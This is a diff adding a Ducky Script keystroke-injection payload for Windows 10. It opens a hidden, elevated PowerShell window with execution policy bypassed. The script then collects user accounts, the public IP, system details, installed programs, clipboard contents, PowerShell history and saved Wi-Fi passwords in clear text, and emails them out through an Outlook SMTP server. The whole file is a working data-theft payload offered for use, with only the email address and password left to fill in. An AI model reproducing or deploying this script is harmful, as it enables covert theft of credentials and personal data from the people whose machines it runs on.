@@ -1,0 +1,56 @@
+REM Title: Email System & User Information
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to gather user and system information and send to an Email.
+REM Target: Windows 10
+
+REM *REQUIREMENTS*
+REM you will need a Microsoft Outlook Email address for this to work
+
+REM *SETUP*
+REM replace EMAIL_HERE and PASSWORD_HERE below.
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM replace EMAIL_HERE and PASSWORD_HERE below.
+STRING $eml = "EMAIL_HERE";$psw = "PASSWORD_HERE"
+
+REM main powershell code
+ENTER
+DELAY 100
+STRING ;$usr = "Username: $($usrinf.Name)";$usr += "`nFull Name: $($usrinf.FullName)`n";$usr+="Public Ip Address = ";$usr+=((I`wr ifconfig.me/ip).Content.Trim() | Out-String)
+STRING ;$usr+="`n";$usr+="All User Accounts: `n";$usr+= Get-WmiObject -Class Win32_UserAccount;$sys = Get-WmiObject -Class Win32_OperatingSystem
+STRING ;$bios = Get-WmiObject -Class Win32_BIOS;$proc = Get-WmiObject -Class Win32_Processor;$comp = Get-WmiObject -Class Win32_ComputerSystem;$usrinf = Get-WmiObject -Class Win32_UserAccount
+STRING ;$sysstr = "Operating System: $($sys.Caption) $($sys.OSArchitecture)";$sysstr += "`nBIOS Version: $($bios.SMBIOSBIOSVersion)";$sysstr += "`nProcessor: $($proc.Name)"
+STRING ;$sysstr += "`nMemory: $($sys.TotalVisibleMemorySize) MB";$sysstr += "`nComputer Name: $($comp.Name)";$iprog = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version
+STRING ;$progstr = "Installed Programs:`n";foreach($program in $iprog){;$progstr += "$($program.Name) $($program.Version)`n"}
+
+STRING ;$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+"
+STRING ;foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
+STRING ;$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()};$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None"
+STRING ;foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$wifistr+="SSID: $ssid`nPassw: $pass`n"}}}$a++;}
+STRING ;$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+STRING ;" USER INFO`n" | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII;$usr | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append
+STRING ;" CLIPBOARD INFO`n" | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append;Get-Clipboard | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append
+STRING ;" POWERSHELL HISTORY`n" | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append;Get-Content $pshist | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append
+STRING ;" SYSTEM INFO`n" | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append;$sysstr | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append
+STRING ;" WIFI INFO`n" | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append;$wifistr | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append
+STRING ;" PROGRAMS INFO`n" | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append;$progstr | Out-File -FilePath "$env:temp\sys.txt" -Encoding ASCII -Append
+
+STRING ;$syslog = "$env:temp\sys.txt";$subj = "$env:COMPUTERNAME : : Results";$body = "$env:COMPUTERNAME : Info Scraper Results... : $time"
+STRING ;$smtp = "smtp.outlook.com";$prt = "587";$cdtl = new-object Management.Automation.PSCredential $eml, ($psw | ConvertTo-SecureString -AsPlainText -Force)
+STRING ;$time = Get-Date;$ct = $time.addminutes($lost)
+
+STRING ;send-mailmessage -from $eml -to $eml -subject $subj -body $body -Attachment $syslog -smtpServer $smtp -port $prt -credential $cdtl -usessl
+STRING ;sleep 1;exit
+ENTER
